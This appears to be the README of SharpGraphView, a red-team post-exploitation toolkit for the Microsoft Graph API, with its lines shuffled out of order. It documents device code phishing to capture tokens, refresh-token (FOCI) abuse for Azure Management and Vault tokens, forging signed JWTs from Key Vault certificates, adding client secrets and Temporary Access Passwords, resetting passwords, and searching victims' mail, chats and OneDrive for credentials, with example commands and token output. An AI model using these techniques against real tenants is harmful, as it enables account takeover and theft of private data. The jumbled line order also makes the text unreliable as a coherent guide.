
  
        - [Auth Methods](#Auth-methods)
        - [Post-Auth Methods](#post-auth-methods)
    "@odata.type": "#microsoft.graph.directoryRole",
    "deletedDateTime": null,
    "description": "Can read everything that a Global Administrator can, but not update anything.",
    "description": "Members of this group will have access to DevOps resources"
    "displayName": "DevOps",
    "displayName": "Global Reader",
    "id": "5a48ab0f-c546-441f-832a-8ab48348e372",
    "roleTemplateId": "f2ef992c-3afb-46b9-b7cf-a126ee74c451"
    - [Common HTTP Error Codes](#Common-HTTP-Error-Codes)
    - [Flags](#Flags)
    - [Get-GraphTokens](#Get-GraphTokens)
    - [Get-TokenScope](#Get-TokenScope)
    - [Invoke-CertToAccessToken](#Invoke-CertToAccessToeken)
    - [Invoke-RefreshToAzureManagementToken](#Invoke-RefreshToAzureManagementToken)
    - [Invoke-RefreshToMSGraphToken](#Invoke-RefreshToMSGraphToken)
    - [Invoke-RefreshToVaultToken](#Invoke-RefreshToVaultToken)
    - [Methods](#Methods)
    - [New-SignedJWT](#New-SignedJWT)
    -Cert                                    - X509Certificate path
    -Domain                                  - Target domain
    -Entity                                  - Search entity [driveItem (OneDrive), message (Mail), chatMessage (Teams), site (SharePoint), event (Calenders)]
    -Id                                      - ID of target object
    -Key                                     - Azure Key Vault name (New-SignedJWT)
    -Query                                   - Raw API query (GET request only)
    -Search                                  - Search string
    -Select                                  - Filter output for comma seperated properties
    -Tenant                                  - Target tenant ID
    -Token                                   - Microsoft Graph access token or refresh token for FOCI abuse
    -help                                    - Show help
    Add-ApplicationPassword                  - Add client secret to target application
    Add-UserTAP                              - Add new Temporary Access Password (TAP) to target user
    Find-PrivilegedRoleUsers                 - Find users with privileged roles assigned
    Get-AdministrativeUnitMember             - Get members of administrative unit
    Get-AppRoleAssignments                   - Get application role assignments for current user (default) or target user (-id)
    Get-ConditionalAccessPolicy              - Get conditional access policy properties
    Get-CrossTenantAccessPolicy              - Get cross tentant access policy properties
    Get-CurrentUser                          - Get current user profile
    Get-CurrentUserActivity                  - Get recent actvity and actions of current user
    Get-Domains                              - Get domain objects
    Get-GraphTokens                          - Obtain graph token via device code phish (saved to graph_tokens.txt)
    Get-Group                                - Get all groups (default) or target group (-id)
    Get-GroupMember                          - Get all members of target group
    Get-Messages                             - Get all messages in signed-in user's mailbox (default) or target user (-id)
    Get-OneDriveFiles                        - Get all accessible OneDrive files for current user (default) or target user (-id)
    Get-OrgInfo                              - Get information relating to the target organisation
    Get-PartnerCrossTenantAccessPolicy       - Get partner cross tenant access policy
    Get-Password                             - Get passwords registered to current user (default) or target user (-id)
    Get-PersonalContacts                     - Get contacts of the current user
    Get-TemporaryAccessPassword              - Get TAP details for current user (default) or target user (-id)
    Get-TenantID                             - Get tenant ID for target domain
    Get-TokenScope                           - Get scope of supplied token
    Get-User                                 - Get all users (default) or target user (-id)
    Get-UserChatMessages                     - Get ALL messages from all chats for target user (Chat.Read.All)
    Get-UserGroupMembership                  - Get group memberships for current user (default) or target user (-id)
    Get-UserPermissionGrants                 - Get permissions grants of current user (default) or target user (-id)
    Get-UserProperties                       - Get current user properties (default) or target user (-id)
    Get-UserTransitiveGroupMembership        - Get transitive group memberships for current user (default) or target user (-id)
    Get-oauth2PermissionGrants               - Get oauth2 permission grants for current user (default) or target user (-id)
    Invoke-CertToAccessToken                 - Convert Azure Application certificate to JWT access token (saved to cert_tokens.txt)
    Invoke-CustomQuery                       - Custom GET query to target Graph API endpoint
    Invoke-RefreshToAzureManagementToken     - Convert refresh token to Azure Management token (saved to az_tokens.txt)
    Invoke-RefreshToMSGraphToken             - Convert refresh token to Micrsoft Graph token (saved to new_graph_tokens.txt)
    Invoke-RefreshToVaultToken               - Convert refresh token to Azure Vault token (saved to vault_tokens.txt)
    Invoke-Search                            - Search for string within entity type (driveItem, message, chatMessage, site, event)
    List-AdministrativeUnits                 - List administrative units
    List-Applications                        - List all Azure Applications
    List-AuthMethods                         - List authentication methods for current user (default) or target user (-id)
    List-ChatMessages                        - List messages in target chat (-id)
    List-Chats                               - List chats for current user (default) or target user (-id)
    List-ConditionalAccessPolicies           - List conditional access policy objects
    List-ConditionalAuthenticationContexts   - List conditional access authentication context
    List-ConditionalNamedLocations           - List conditional access named locations
    List-Devices                             - List devices
    List-DirectoryRoles                      - List all directory roles activated in the tenant
    List-ExternalConnections                 - List external connections
    List-JoinedTeams                         - List joined teams for current user (default) or target user (-id)
    List-Notebooks                           - List current user notebooks (default) or target user (-id)
    List-OneDrives                           - List current user OneDrive (default) or target user (-id)
    List-RecentOneDriveFiles                 - List current user recent OneDrive files
    List-ServicePrincipals                   - List all service principals
    List-SharePointRoot                      - List root SharePoint site properties
    List-SharePointSites                     - List any available SharePoint sites
    List-SharedOneDriveFiles                 - List OneDrive files shared with the current user
    List-Tenants                             - List tenants
    New-SignedJWT                            - Construct JWT and sign using Key Vault certificate (Azure Key Vault access token required) then generate Azure Management (ARM) token
    SharpGraphView.exe Get-GraphTokens
    SharpGraphView.exe Get-User -id john.doe@vulncorp.onmicrosoft.com -token .\token.txt -select displayname,id
    SharpGraphView.exe Get-UserGroupMembership -token eyJ0eXAiOiJKV1QiLC...
    SharpGraphView.exe Invoke-CustomQuery -Query "https://graph.microsoft.com/v1.0/sites/{siteId}/drives" -token .\token.txt
    SharpGraphView.exe Invoke-RefreshToAzureManagementToken -tenant <tenant id> -token <refresh token>
    SharpGraphView.exe Invoke-Search -search "password" -entity driveItem -token eyJ0eXAiOiJKV1QiLC...
    SharpGraphView.exe List-RecentOneDriveFiles -token .\token.txt
    SharpGraphView.exe [Method] [-Domain <domain>] [-Tenant <tenant id>] [-Id <object id>] [-Select <display property>] [-Query <api endpoint>] [-Search <string> -Entity <entity>] [-Token <access token>] [-Cert <pfx cert>]
    Update-UserPassword                      - Update the passwordProfile of the target user (NewUserS3cret@Pass!)
  - more details can be found within the [Microsoft Graph API docs](https://learn.microsoft.com/en-us/graph/api/resources/searchrequest?view=graph-rest-1.0)
  - need to add `queryTemplate` option to filter by properties (e.g. `{searchTerms} CreatedBy:` etc.) using [KQL](https://learn.microsoft.com/en-us/sharepoint/dev/general-development/keyword-query-language-kql-syntax-reference)
  {
  }
  },
 https://devappvault.vault.azure.net/certificates/DevAppCert
![getgraphtokens-edit-crop](https://github.com/mlcsec/SharpGraphView/assets/47215311/65de3da1-f40a-46c2-959c-f99885fd80cc)
![invokemsgraphrefresh-edit-crop](https://github.com/mlcsec/SharpGraphView/assets/47215311/46ca692d-d48c-4262-9f47-6ae0b6f004f0)
![nuget-restore](https://github.com/mlcsec/SharpGraphView/assets/47215311/303148b7-bad8-4243-9deb-f8fe2cd44496)
# Build
# Demo
# Observations
# SharpGraphView 
# Todo
# Usage
# client secret auth:
# connect with new Vault token
## Addtional Authentication Methods
## Common HTTP Error Codes
## Flags
## Get-GraphTokens
## Get-TokenScope
## Index
## Invoke-CertToAccessToken
## Invoke-RefreshToAzureManagementToken
## Invoke-RefreshToMSGraphToken
## Invoke-RefreshToVaultToken
## Methods
## New-SignedJWT
## READ-ONLY: Please see [Graphpython](https://github.com/mlcsec/Graphpython) for a more comprehensive solution covering everything from SharpGraphView and much more
## Test
### Auth Methods:
### Coming soon:
### Post-Auth Methods:
#### -Cert
#### -Domain
#### -ID
#### -Key
#### -Query
#### -Search & -Entity
#### -Select
#### -Tenant
#### -Token
$password = ConvertTo-SecureString 'app secret...' -AsPlainText -Force
- Costura.Fody
- Flags in square brackets/italics below are optional arguments. Flags without are **REQUIRED**.
- Newtonsoft.Json
- The `-token` flag is **REQUIRED** for all post-authentication methods.
- [Build](#Build)
- [Demo](#Demo)
- [Observations](#Observations)
- [Updates](#Updates)
- [Usage](#Usage)
- `400` - Bad request, can occur when authenticated as a service principal and attempt to use methods which target `/me/<...>` endpoints
- `401` - Unauthorised, commonly occurs when an access token expires, isn't formatted correctly, or hasn't been supplied
- `403` - Access to the resource/endpoint is forbidden, likely due to insufficient perms or some form of conditional access
- `429` - User has sent too many requests in a given amount of time and triggered tate limiting, hold off for a few minutes
- bofnet_executeassembly 
- can be the user ID or User Principal Name for user related methods
- inlineExecute-Assembly 
- use the object ID for all others (groups, admin units, etc.)
- useful for enumerating drive items and other resources with variable endpoints:
-------                                      ----------------       --------                             -----------
-------                              ----------------       --------                             -----------
...
.\SharpGraphView.exe New-SignedJWT -id <appid> -tenant <tenantid>  -query https://devappvault.vault.azure.net -key DevAppCert -token <vault token>
<br>
> All methods and flags are case-insensitve. Method must be the first argument, flags are position-independent.
> All methods are subject to the assigned roles and permissions for the current access account
> More commands and options to be added
Account                                      SubscriptionName       TenantId                             Environment
Account                              SubscriptionName       TenantId                             Environment
Additional auth methods from [Connect-MgGraph](https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.authentication/connect-mggraph?view=graph-powershell-1.0) can be ported as necessary.
Addtional `Invoke-RefreshTo...` methods can be ported from [TokenHandler.ps1](https://github.com/rvrsh3ll/TokenTactics/blob/main/modules/TokenHandler.ps1).
An Azure Vault token can be obtained in a similar fashion:
AuditLog.Read.All
Auth:
Calendar.ReadWrite
Calendars.Read.Shared
Calendars.ReadWrite
Compiled executable in `bin/Release` is ready to go. 
Connect-MgGraph -ClientSecretCredential $creds -TenantId <>
Construct new JWT token with the details extracted from Key Vault Certificate and sign it. Requires the following permissions:
Contacts.ReadWrite
Created during the [Advanced Azure Cloud Attacks Lab](https://www.alteredsecurity.com/azureadvanced). Inspired by [GraphRunner](https://github.com/dafthack/GraphRunner) and [TokenTactics](https://github.com/rvrsh3ll/TokenTactics).
Currently, only access token authentication is supported. The following authentication processes will be ported:
DataLossPreventionPolicy.Evaluate
Directory.AccessAsUser.All
Directory.Read.All
Display the scope of the access token:
Example below returning select user details from `/me` endpoint:
Examples:
FOCI can be abused again to obtain a new Microsoft Graph token if the original token has expired:
FOCI can be abused to obtain a valid Azure Management token using the refresh token obtained from `Get-GraphTokens`. Use `Get-TenantID -domain <target.domain>` to get the tenant ID of the target domain. 
Files.Read
Files.Read.All
Files.ReadWrite.All
Filter output and only display the supplied comma separated properties:
Flags:
GET /drives/{drive-id}/items/{item-id}/children
GET /groups/{group-id}/drive/items/{item-id}/children
GET /me/drive/items/{item-id}/children
GET /sites/{site-id}/drive/items/{item-id}/children
GET /users/{user-id}/drive/items/{item-id}/children
Generates a sign-in message along with a unique code to be sent to the victim (device code phishing). Monitors for authentication, with a timeout set to 15 minutes. Upon successful authentication, a valid token is returned:
Generating a signed JWT and request an Azure Management token (ARM):
Group.Read.All
Group.ReadWrite.All
ID of target object
If loading and building for the first time select the 'Restore' button in VS (may need to add and use [nuget.org](https://learn.microsoft.com/en-us/nuget/consume-packages/install-use-packages-visual-studio#package-sources) as a package source then update any packages via `References` > `Manage NuGet Packages...` > `Updates`)
InformationProtectionPolicy.Read
JohnDoe@TargetCorp1.onmicrosoft.com          TargetCorp1            fbf34b9d-6375-4137-ae1f-8cb12df29bb5 AzureCloud
Key Vault certificate key name (**REQUIRED** for `New-SignedJWT` method) e.g. take the following Key Vault Certificate URL endpoint:
Mail.ReadWrite
Mail.Send
Microsoft Graph access token (**REQUIRED** for all methods except `Get-GraphTokens`) or refresh token for FOCI abuse (`Invoke-Refresh*` methods)
Microsoft.KeyVault/vaults/certificates/read
Microsoft.KeyVault/vaults/keys/read
Microsoft.KeyVault/vaults/keys/sign/action
Notes.Create
Obtain an access token from a valid Azure Application certificate then authenticate as the service principal:
Organization.Read.All
PS > $aztoken = "eyJ0eXAiOiJKV1QiLCJ..."
PS > .\SharpGraphView.exe Get-Group -token .\token.txt
PS > .\SharpGraphView.exe Get-Group -token .\token.txt -select displayname,description
PS > .\SharpGraphView.exe Get-Group -token eyJ0eXAiOiJKV1QiLCJ...
PS > .\SharpGraphView.exe Get-TenantID -domain targetcorp.domain
PS > .\SharpGraphView.exe Get-User -id 5a48ab0f-c546-441f-832a-8ab48348e372 -token .\token.txt
PS > .\SharpGraphView.exe Get-User -id JohnDoe@TargetCorp1.onmicrosoft.com -token .\token.txt
PS > .\SharpGraphView.exe Invoke-CertToAccessToken -tenant <tenant id> -cert .\cert.pfx -id <app id>
PS > .\SharpGraphView.exe Invoke-RefreshToAzureManagementToken -token refreshtoken.txt -tenant fbf34b9d-6375-4137-ae1f-8cb12df29bb5
PS > .\SharpGraphView.exe Invoke-RefreshTokenToMSGraphToken -token .\refreshtoken.txt -tenant <tenant id>
PS > .\SharpGraphView.exe New-SignedJWT -id f9f75aac-fe0a-47e6-bfd3-98d8af327d8a -tenant fbf34b9d-6375-4137-ae1f-8cb12df29bb5 -query https://DevAppVault.vault.azure.net -key DevAppCert -token $vault_token
PS > .\SharpGraphView.exe get-tokenscope -token eyJ0eXAiOiJKV...
PS > .\SharpGraphView.exe get-usergroupmembership -token .\token.txt
PS > .\SharpGraphView.exe invoke-customquery -query https://graph.microsoft.com/v1.0/me -token .\token.txt -select displayname,userprincipalname
PS > .\SharpGraphView.exe invoke-refreshtovaulttoken -token <refresh>
PS > .\SharpGraphView.exe invoke-search -search "credentials" -entity driveItem -token .\token.txt
PS > .\SharpGraphView.exe invoke-search -search "password" -entity message -token .\token.txt
PS > Connect-AzAccount -AccessToken $aztoken -AccountId JohnDoe@TargetCorp1.onmicrosoft.com
PS > Connect-AzAccount -AccessToken <ARM access token> -KeyVaultAccessToken <vault access token> -AccountId <user account>
PS > Connect-AzAccount -AccessToken eyJ0eXAiOi... -AccountId f9f75aac-fe0a-47e6-bfd3-98d8af327d8a
Path to Azure Application X509Certificate (**REQUIRED** for `Invoke-CertToAccessToken`):
People.Read
People.Read.All
Post-Auth:
PrintJob.ReadWriteBasic
Printer.Read.All
Raw API query (GET request endpoints only currently)
Search string, e.g. "password"
SensitiveInfoType.Detect
SensitiveInfoType.Read.All
SensitivityLabel.Evaluate
Several HTTP error codes may be encountered when running certain methods:
Sharp post-exploitation toolkit providing modular access to the Microsoft Graph API (*graph.microsoft.com*) for cloud and red team operations. 
SharpGraphView by @mlcsec
Target Tenant ID (**REQUIRED** for `Invoke-Refresh*` methods)
Target domain name (**REQUIRED** for `Get-TenantID`)
Target resource (entity) to search e.g. driveItem (OneDrive), message (Mail), chatMessage (Teams), site (SharePoint), event (Calenders)
Tasks.ReadWrite
TeamMember.ReadWrite.All
TeamsTab.ReadWriteForChat
The -Key value would be `DevAppCert`
The Azure Management token can then be used with `Connect-AzAccount` to access Azure resources via the Azure Management (Az) PowerShell module:
The Microsoft Graph API access token can then be copied to a local file or directly parsed to the `-token` parameter:
The access token can then be used as normal with the `-Token` flag.
The following packages are required:
The returned management token can then be used to authenticate to Azure:
Usage:
User.Read.All
User.ReadBasic.All
User.ReadWrite
Users.Read
[*] Application ID: f9f75aac-fe0a-47e6-bfd3-98d8af327d8a
[*] Get-Group
[*] Get-TokenScope
[*] Get-UserGroupMembership
[*] Invoke-CertToAccessToken
[*] Invoke-CustomQuery
[*] Invoke-RefreshToVaultToken
[*] New-SignedJWT
[*] Scope: https://management.azure.com/.default
[*] Tenant ID: fbf34b9d-6375-4137-ae1f-8cb12df29bb5
[*] access_token: eyJ0eXAiOiJKV1QiL...
[*] access_token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IkwxS2ZLRklfam5YYndXYzI...
[*] access_token: eyJ0eXAiOiJKV1QiLCJub2...
[*] expires_in: 3599
[*] expires_in: 5164
[*] ext_expires_in: 3599
[*] ext_expires_in: 5164
[*] foci: 1
[*] id_token: eyJ0eXAiOiJKV1Q...
[*] refresh_token: 0.AUoAQlq91mV...
[*] scope: https://vault.azure.net/user_impersonation https://vault.azure.net/.default
[*] token_type: Bearer
[+] Azure Management Token Obtained!
[+] Certificate Details Obtained!
[+] Forged JWT:
[+] Token Obtained!
[+] Token information written to 'cert_tokens.txt'.
[+] Token information written to 'vault_tokens.txt'.
]
```
```powershell
creds = New-Object System.Management.Automation.PSCredential('app id', $password)
displayName: John Doe
eyJ4NXQiOiJxNnhGejN6RVg4akpheC1paHZlMWgtUmR1TVUiLCJ0eXAiOi...
f9f75aac-fe0a-47e6-bfd3-98d8af327d8a TargetCorp-1           fbf34b9d-6375-4137-ae1f-8cb12df29bb5 AzureCloud
kid: https://devappvault.vault.azure.net/keys/DevAppCert/2fb10001e7f0474916dec596b3818d56
userPrincipalName: JohnDoe@TargetCorp1.onmicrosoft.com
value: [
x5t: 9xdFz3zEX8jJax-ihve1h-GhmQa
| **Find-PrivilegedRoleUsers**                 | Find users with privileged roles assigned                                               |
| **Get-AdministrativeUnitMember** -ID \<admin unit id\>             | Get members of administrative unit                      |
| **Get-AppRoleAssignments** _[-ID <userid/upn>]_                   | Get application role assignments for current user (default) or target user (-id)                                           |
| **Get-ConditionalAccessPolicy** -ID \<cap id\>             | Get conditional access policy properties                            |
| **Get-CrossTenantAccessPolicy**              | Get cross tenant access policy properties                                               |
| **Get-CurrentUser**                          | Get current user profile                                         |
| **Get-CurrentUserActivity**                  | Get recent activity and actions of current user                         |
| **Get-Domains**                              | Get domain objects                                               |
| **Get-GraphTokens**                          | Get graph token via device code phish (saved to _graph_tokens.txt_) | 
| **Get-Group** _[-ID \<groupid\>]_                               | Get all groups (default) or target group (-id)                              |
| **Get-GroupMember** -ID \<groupid\>                         | Get all members of target group                              |
| **Get-Messages** _[-ID \<userid/upn\>]_                            | Get all messages in signed-in user's mailbox (default) or target user (-id)                                               |
| **Get-OneDriveFiles** _[-ID \<userid/upn\>]_                      | Get all accessible OneDrive files for current user (default) or target user (-id)                                             |
| **Get-OrgInfo**                              | Get information relating to the target organization                                               |
| **Get-PartnerCrossTenantAccessPolicy**       | Get partner cross tenant access policy                                              |
| **Get-Password** _[-ID \<userid/upn\>]_                            | Get passwords registered to current user (default) or target user (-id)                    |
| **Get-PersonalContacts**                     | Get contacts of the current user                                               |
| **Get-TemporaryAccessPassword** _[-ID \<userid/upn\>]_             | Get TAP details for current user (default) or target user (-id)                   |
| **Get-TenantID** -Domain \<domain\>                            | Get tenant ID for target domain  | 
| **Get-TokenScope** -Token \<token\>                   | Get scope for the supplied token|
| **Get-User** _[-ID <userid/upn>]_                 | Get all users (default) or target user (-id)  |
| **Get-UserChatMessages** -ID \<userid/upn\>                    | Get all messages from all chats for target user     |
| **Get-UserGroupMembership** _[-ID <userid/upn>]_                 | Get group memberships for current user (default) or target user (-id)  |
| **Get-UserPermissionGrants** _[-ID \<userid/upn\>]_                | Get permissions grants of current user (default) or target user (-id)                          |
| **Get-UserProperties** _[-ID <userid/upn>]_                       | Get current user properties (default) or target user (-id) !WARNING! loud/slow due to 403 errors when grouping properties        |
| **Get-UserTransitiveGroupMembership** _[-ID <userid/upn>]_       | Get transitive group memberships for current user (default) or target user (-id)                |
| **Get-oauth2PermissionGrants** _[-ID \<userid/upn\>]_              | Get oauth2 permission grants for current user (default) or target user (-id)                                               |
| **Invoke-CustomQuery** -Query \<graph endpoint URL\>                      | Custom GET query to target Graph API endpoint e.g. `https://graph.microsoft.com/v1.0/me`                                           |
| **Invoke-RefreshToAzureManagementToken** -Token \<refresh\> -Tenant \<id\>    | Convert refresh token to Azure Management token (saved to _az_tokens.txt_)|
| **Invoke-RefreshToMSGraphToken** -Token \<refresh\> -Tenant \<id\>            | Convert refresh token to Microsoft Graph token (saved to _new_graph_tokens.txt_)  |  
| **Invoke-Search** -Search \<string\> -Entity \<entity\>                           | Search for string within entity type (driveItem, message, chatMessage, site, event)          |
| **List-AdministrativeUnits**                 | List administrative units                                               |
| **List-Applications**                        | List all Azure Applications                                              |
| **List-AuthMethods** _[-ID \<userid/upn\>]_                        | List authentication methods for current user (default) or target user (-id)                                           |
| **List-Chats** _[-ID \<userid/upn\>]_                              | List chats for current user (default) or target user (-id)  |
| **List-ConditionalAccessPolicies**           | List conditional access policy objects                                              |
| **List-ConditionalAuthenticationContexts**   | List conditional access authentication context                                             |
| **List-ConditionalNamedLocations**           | List conditional access named locations                                               |
| **List-Devices**                             | List devices                                                |
| **List-DirectoryRoles**                      | List all directory roles activated in the tenant                                            |
| **List-ExternalConnections**                 | List external connections                                               |
| **List-JoinedTeams** _[-ID \<userid/upn\>]_                        | List joined teams for current user (default) or target user (-id)|
| **List-Notebooks** _[-ID \<userid/upn\>]_                          | List current user notebooks (default) or target user (-id)                                               |
| **List-OneDrives** _[-ID \<userid/upn\>]_                          | List current user OneDrive (default) or target user (-id)                            |
| **List-RecentOneDriveFiles**                 | List current users recent OneDrive files                                               |
| **List-ServicePrincipals**                   | List all service principals                                               |
| **List-SharePointRoot**                      | List root SharePoint site properties                                              |
| **List-SharePointSites**                     | List any available SharePoint sites                                           |
| **List-SharedOneDriveFiles**                 | List OneDrive files shared with the current user                                               |
| **List-Tenants**                             | List tenants                                               |
| **Update-UserPassword** -ID \<userid/upn\> | Update the passwordProfile of the target user (NewUserS3cret@Pass!) |
| Add-GroupMember                          | Add user to target group                                              | `POST /groups/{group-id}/members/$ref`        |
| Command                                  | Description                                    |
| Create-User                              | Create new malicious user                                                | `POST /users`          |
| Method                                  | Description                                                     |
| Method                                  | Description                                                     |Endpoints                                        |
|**Add-ApplicationPassword** -ID \<appid\> |Add client secret to target application|
|**Add-UserTAP** -ID \<userid/upn\> |Add new Temporary Access Password (TAP) to target user|
|**Invoke-CertToAccessToken** -Cert \<path to pfx\> -ID \<app id\> -Tenant \<id\>| Convert Azure Application certificate to JWT access token|
|**Invoke-RefreshToVaultToken** -Token \<refresh\> | Convert refresh token to Azure Vault token (saved to _vault_tokens.txt_)|
|**New-SignedJWT** -ID \<appid\> -Tenant \<id\> -Query \<vault URL\> -key \<vault key\> -Token \<vault token\> |Construct JWT and sign using Key Vault certificate (Azure Key Vault access token required) then generate Azure Management (ARM) token|
|------------------------------------------|-----------------------------------------------------------------|
|------------------------------------------|-----------------------------------------------------------------|-----------------------------------------------|
|------------------------------------------|------------------------------------------------|
